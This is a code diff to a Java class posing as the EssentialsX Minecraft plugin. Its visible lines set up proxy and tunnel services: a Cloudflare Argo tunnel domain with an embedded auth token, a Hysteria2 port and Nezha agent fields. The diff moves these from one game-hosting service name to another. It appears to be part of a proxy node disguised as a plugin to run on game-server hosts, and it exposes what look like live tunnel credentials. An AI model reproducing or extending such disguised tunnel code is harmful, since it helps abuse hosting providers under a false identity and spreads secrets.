@@ -79,10 +79,10 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "optiklink.19861123.tech");
-        env.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiZjIyMWFmMWYtZDc1OS00M2E3LTg4OGMtYzgzOGUwNmRhYTM5IiwicyI6IlpXWXdOV0V6WkRrdE1tSmxOeTAwWkRZMkxUbGtZelV0WWpSalpUUmlaV1kyWm1VNCJ9");
+        env.put("ARGO_DOMAIN", "magmanode.abc2024.ggff.net");
+        env.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiMTQ1NjgwYWYtNDg4Ny00YTc1LTk4Y2EtNGNkNDcyYmE0NzA5IiwicyI6Ik9EQXdNamN3T0RJdFlqUTFNQzAwWWpBeExUZzRaRGt0Tm1JMk1HTmlNMlEzTlRneSJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "8701");
+        env.put("HY2_PORT", "20022");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
-        env.put("NAME", "optiklink");
+        env.put("NAME", "magmanode");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
